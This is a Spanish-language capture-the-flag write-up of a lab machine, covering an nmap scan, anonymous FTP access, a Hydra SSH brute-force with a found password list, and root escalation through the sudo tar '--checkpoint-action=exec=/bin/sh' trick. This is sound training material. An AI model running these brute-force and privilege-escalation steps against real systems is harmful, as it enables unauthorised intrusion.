# Write Up - Cowboyhacker

### **Nmap**

Primero escanearemos los puertos de la máquina a la que nos hemos conectado utilizando el programa Nmap y ejecutando el siguiente comando:

```bash
# Nmap 7.93 scan initiated Tue Jan 10 06:42:57 2023 as: nmap -sCV -n -Pn -p- --min-rate=5000 -oN AllPorts 10.10.51.213
Nmap scan report for 10.10.51.213
Host is up (0.29s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.35.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 10 06:45:13 2023 -- 1 IP address (1 host up) scanned in 135.94 seconds
```

| Argumentos | Descripción |
| --- | --- |
| -sCV | Utiliza los script que trae Nmap por defecto aparte de detectar las versiones de los servicios encontrados |
| -n | Evita realizar la resolución DNS. |
| -Pn | Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos. |
| -p- | Indica que analice los puertos del 1 al 65535 |
| —min-rate= | Indica la cantidad de paquetes que se mandan por segundo. |
| -oN | Sirve para exportar el resultado a un archivo con formato normal. |

Como podemos observar estos son los siguientes puertos abiertos:

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 21 | ftp | vsft*****0.3 |
| 22 | ssh | Open*******p2 |
| 80 | http | Ap**************.18 |

Tras haber realizado el análisis de puerto, lo primero que comprobaremos será acceder a la página web para recabar información.

![Página web.PNG](writeup/img/Pgina_web.png)

Tras no sacar ninguna información, lo segundo que haremos será comprobar si el servicio FTP tiene el usuario por defecto Anonymous.

```bash
ftp Anonymous@10.10.51.213 
Connected to 10.10.51.213.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Como acabamos de comprobar, lo tiene habilitado, por lo tanto, utilizaremos el comando ls para dictar directorios.

```bash
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

Tras visualizar los archivos, lo descargaremos utilizando el comando get ambos archivos, para analizarlos cuando lo tengamos en nuestro sistema.

```bash
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**************************************************************************************************************************|    68        0.99 MiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.22 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**************************************************************************************************************************|   418        7.38 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (0.90 KiB/s)
```

Una vez lo tengamos descargados, utilizaremos el comando cat para ver la información de estos archivos.

```bash
cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-l**
```

Como podemos comprobar, hemos conseguido el usuario que escribió el archivo task.txt

```bash
cat locks.txt
rE****GON
ReDdr4****ynd!cat3
Dr@g****n9icat3
R3DDr46ONSYn****Te
ReddR****N
R3dDrag0nSyn****te
dRa6o****DiCATE
ReDD****5ynDIc4te
R3Dr4g****44
RedDr4go****d1cat3
R3dDRaG0Nsyn****T3
Synd1c4t****g0n
red****0N
REddRaG0****dIc47e
Dra6****ndIC@t3
4L1mi6****tHeB357
rEDdrag****nd1c473
DrAgo****D1cATE
ReDdrag0****d1cate
Dr@gOn****1C4Te
RedD****Syn9ic47e
RE****dIc47e
dr@goN5Y****73
rEDdrAGO****DiCat3
r****@g0N
ReDS****7e
```

En el archivo locks.txt observamos lo que podrían ser contraseñas por el hecho de que utiliza caracteres complejos, por lo tanto usaremos el usuario L** y el diccionario encontrado para realizar un ataque de fuerza bruta al servicio ssh.

### Hydra

En este caso utilizaremos el programa Hydra para realizar al servicio que indiquemos y dirección IP que realice un ataque de fuerza bruta a dicho usuario con el diccionario que le asignemos.

```bash
hydra -l l** -P locks.txt 10.10.160.21 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-10 07:58:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.160.21:22/
[22][ssh] host: 10.10.160.21   login: l**   password: Red***********cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-10 07:59:05
```

| Argumentos | Descripción |
| --- | --- |
| -l | Sirve para indicar el usuario. |
| -P | Sirve para indicar el diccionario. |
| 10.10.160.21 | Se indica la IP de la máquina contraria. |
| ssh | Se indica el servicio al que realizará el ataque de fuerza bruta. |

Al descubrir que el usuario l** puede acceder con la contraseña Red***********cat3 por ssh, nos conectaremos a dicho servicio con estas credenciales obtenidas.

```bash
ssh l**@10.10.160.21
lin@10.10.160.21's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Tue Jan 10 07:06:06 2023 from 10.8.35.7
l**@bountyhacker:~/Desktop$
```

Como podemos observar, hemos conseguido acceder al usuario, por lo que utilizaremos ahora el comando ls para dictar los archivos que existen en el directorio.

```bash
l**@bountyhacker:~/Desktop$ ls
user.txt
```

Ahora utilizaremos el comando cat para ver la información que contiene este archivo.

```bash
l**@bountyhacker:~/Desktop$ cat user.txt
THM{CR**********4T3}
```

Dentro del archivo user.txt que se encontraba en el escritorio hemos podido encontrar la flag del usuario, por lo tanto, nos queda encontrar la flag del usuario root.

```bash
l**@bountyhacker:~/Desktop$ cd /root
-bash: cd: /root: Permission denied
```

Al intentar acceder a la carpeta root, nos da un error en el que nos indica se nos ha negado el permiso de acceso, por lo que tendremos que realizar una escalada de privilegios, para realizar esto comprobaremos que programas podemos utilizar con permisos de administrador utilizando el comando sudo -l.

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

### Gtfobins

El mensaje nos indica que el único archivo que podemos utilizar como administrador es el comando tar en este caso, por lo que iremos a la página de Gtfobins para buscar algún comando que utilice tar para que nos deje realizar una escalada de privilegios.

![gtfobins tar sudo.PNG](writeup/img/gtfobins_tar_sudo.png)

Tras encontrar el comando que podría funcionar, lo intentaremos utilizar en la máquina para ver si ganamos acceso como root en el sistema.

```bash
l**@bountyhacker:~/Desktop$     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names

# whoami
root
```

Tras conseguir acceder como root, buscaremos los archivos que puedan existir en la carpeta root.

```bash
# cd root
# ls
root.txt
```

Por último haremos un cat al archivo para obtener la flag del root.

```bash
cat root.txt
THM{80UN******K3r}
```

### 

## Contact

[📧 danielruizraposo02@gmail.com](mailto:danielruizraposo02@mail.com)